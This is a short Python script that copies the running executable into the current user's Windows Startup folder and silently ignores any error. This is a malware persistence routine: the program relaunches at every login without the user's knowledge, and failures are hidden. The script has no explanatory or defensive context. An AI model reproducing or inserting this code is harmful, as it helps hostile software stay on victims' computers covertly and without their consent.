import shutil
import sys
import os

user = os.getlogin()
filepath = sys.executable
startup_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

try:
    shutil.copy(filepath, startup_path)
except:
    pass